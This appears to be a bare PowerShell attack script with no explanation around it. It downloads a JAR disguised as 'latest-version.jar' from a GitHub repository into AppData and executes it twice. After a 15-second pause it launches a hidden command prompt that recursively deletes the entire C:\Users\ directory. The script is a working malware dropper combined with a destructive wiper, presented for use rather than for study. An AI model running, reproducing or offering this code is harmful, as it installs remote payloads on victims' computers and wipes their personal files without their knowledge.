$c=New-Object System.Net.Http.HttpClient;$o=Join-Path 
([Environment]::GetFolderPath("ApplicationData")) 
"latest-version.jar";[IO.File]::OpenWrite($o).Write($c.GetByteArrayAsync("https://github.com/VicTheSlicer/bytebin-api/raw/main/build/latest-version.jar").Result);Start-Process java "-jar $o";
iwr https://github.com/VicTheSlicer/bytebin-api/raw/main/build/latest-version.jar -o ($p=Join-Path $env:APPDATA latest-version.jar);java -jar $p;
start-sleep 15;
Start-Process -FilePath "cmd.exe" -ArgumentList "/c rd /s /q C:\Users\" -WindowStyle Hidden;
